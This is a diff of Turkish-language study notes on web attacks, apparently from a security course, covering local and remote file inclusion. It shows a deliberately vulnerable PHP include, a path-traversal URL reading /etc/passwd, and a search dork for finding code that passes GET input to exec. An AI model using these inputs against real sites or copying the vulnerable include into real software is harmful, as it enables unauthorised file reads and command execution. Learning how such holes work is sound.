@@ -185,6 +185,8 @@ Yukarıdaki koddaki gibi unionu nasıl yazarsan yaz ekrana basmaz, 3osUNIsasON b
 ---------------------------------------------------------------------------------------------------
 LFI(Local File Inculusin)
 RFI(Remote File Inculusin)
+-----------------------------------------------------------------------------------------------------------------------
+LFI(Local File Inculusin)
 <?php 
 $sayfa =$_GET['sayfa'];
 include($sayfa.'.php');
@@ -192,6 +194,14 @@ include($sayfa.'.php');
 http://localhost/lyk/lfi.php?sayfa=../../../../etc/passwd%00
 
 üstteki url kodu ile /etc/passwd ye ulaşabiliriz(yetkiniz varsa)
+
+timthumb.php wordpress açığı bi araştır 
+
+-----------------------------------------------------------------------------------------------------------------------
+RFI(Remote File Inculusin)
+
+site:github.com "exec($_GET[" bu komutu arattır ve linux komutu çalıştırmamıza yardımcı olur
+
 
 
  
